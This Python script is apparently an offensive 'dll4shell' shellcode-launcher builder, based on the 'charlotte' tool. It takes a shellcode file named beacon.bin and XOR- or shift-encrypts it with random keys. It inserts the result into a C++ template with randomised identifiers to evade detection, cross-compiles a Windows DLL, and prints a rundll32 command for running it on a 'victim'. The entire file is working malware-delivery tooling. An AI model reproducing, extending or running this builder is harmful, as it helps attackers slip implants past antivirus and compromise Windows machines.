#!/usr/bin/env python3
import sys
import random
import string
import os
import time
import argparse

def get_random_string():
    # With combination of lower and upper case
    length = random.randint(5, 6)
    result_str = ''.join(random.choice(string.ascii_letters) for i in range(length))
    # print random string
    return result_str

def xor(data):
    
    key = get_random_string()
    l = len(key)
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        o = lambda x: x if isinstance(x, int) else ord(x) # handle data being bytes not string
        output_str += chr(o(current) ^ ord(current_key))

    ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ' };'
    return ciphertext, key

def shift(data):
    output_str = ""

    for i in range(len(data)):
        o = lambda x: x if isinstance(x, int) else ord(x)
        output_str += chr((o(data[i]) + 24) & 0xFF)

    ciphertext = '{ 0x' + ', 0x'.join(hex(ord(x))[2:] for x in output_str) + ' };'
    return ciphertext

def dll4shell(enctype):
    try:
        plaintext = open("beacon.bin", "rb").read() # read as bytes to deal with charset parsing issues
    except:
        print("[*]                    Failed to read beacon.bin :(                [*]")
        print("[*]                    Missing beacon.bin in pwd?                  [*]")
        sys.exit(1) # exit if read failed
    
    pl_key_name = get_random_string()
    calc_name = get_random_string()
    
    pl_key_size = get_random_string()
    
    e1 = get_random_string()
    
    if enctype == "shift":
        ciphertext = shift(plaintext)
    else:
        print("[*]                    Generating XOR Keys...                      [*]")
        ciphertext, pl_key = xor(plaintext)
    
    print("[*]                    Replacing data in dll4shell.cpp...           [*]")

    if enctype == "shift":
        template = open("template-shift.cpp", "rt")

        data = template.read()

        data = data.replace('RunME', e1)

        data = data.replace('unsigned char calc_payload[] = { };', 'unsigned char calc_payload[] = ' + ciphertext)
        
        data = data.replace('calc_payload', calc_name)

        data = data.replace('calc_len', pl_key_size)

    else:
        template = open("template-xor.cpp", "rt")

        data = template.read()

        data = data.replace('RunME', e1)

        data = data.replace('unsigned char calc_payload[] = { };', 'unsigned char calc_payload[] = ' + ciphertext)
        
        data = data.replace('char pl_key[] = "";', 'char pl_key[] = "' + pl_key + '";')
        
        data = data.replace('calc_payload', calc_name)
        
        data = data.replace('pl_key', pl_key_name)
        
        data = data.replace('calc_len', pl_key_size)
    
    template.close()
    template = open("dll4shell.cpp", "w+")
    template.write(data)
    time.sleep(1)
    print("[*]                    dll4shell.cpp generated!                    [*]")
    time.sleep(1)

    template.close
    return e1

banner = """

#############################################
#  Author: Sergey Egorov
#  C++ .DLL shellcode launcher
#
#  Based on Jinkun Ong's 'charlotte' tool
#############################################
"""

def main():

    print(banner)
    
    parser = argparse.ArgumentParser(description='C++ shellcode launcher')
    parser.add_argument("-e", "--encrypt",
                    dest="enc",
                    help="Shellcode encryption type (xor or shift)",
                    default="xor",
                    action='store')

    args = parser.parse_args()

    e1 = dll4shell(args.enc)
    print("[*]                    Completed - Compiling dll4shell.dll         [*]")
    time.sleep(1)
    try:
        os.system("x86_64-w64-mingw32-g++ -shared -o dll4shell.dll dll4shell.cpp -fpermissive >/dev/null 2>&1")
        print("[*]                    Cross Compile Success!                      [*]")
    except:
        print("[*]                    Compilation failed :(                       [*]")
    time.sleep(1)
    print("[*]                    Removing dll4shell.cpp...                   [*]")
    os.system("rm dll4shell.cpp")
    time.sleep(1)
    print("[*]                    Execute on your Windows x64 victim with:    [*]")
    print("[*]                    rundll32 dll4shell.dll, " + e1 + "    [*]")
    print("\n")

if __name__ == "__main__":
    main()